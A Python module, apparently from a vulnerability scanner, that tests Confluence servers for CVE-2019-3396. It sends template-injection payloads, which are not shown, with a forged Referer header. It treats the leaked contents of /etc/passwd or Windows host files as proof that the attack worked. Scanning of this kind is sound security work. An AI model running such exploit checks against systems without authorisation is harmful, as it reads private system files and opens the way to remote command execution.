#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2019_3396_scan(self, url):
    ''' Atlassian Confluence 6.14.2 版本之前存在未经授权的目录遍历漏洞, 
        攻击者可以使用 Velocity 模板注入读取任意文件或执行任意命令
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    # vul_info['vul_type'] = 'FileRead/RCE'
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'CVE-2019-3396'
    vul_info['vul_method'] = 'POST'

    for payload in self.cve_2019_3396_payloads:
        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        headers['Referer'] = 'http://' + logger.get_domain(url) # * Referer头, Confluence有时会有XSRF检测, 必须是目标的Host才行

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if ((self.md in check.check_res(res.text, self.md))
                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
                or (('<?xml version="1.0" encoding="UTF-8"?>' in res.text) and ('Confluence' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
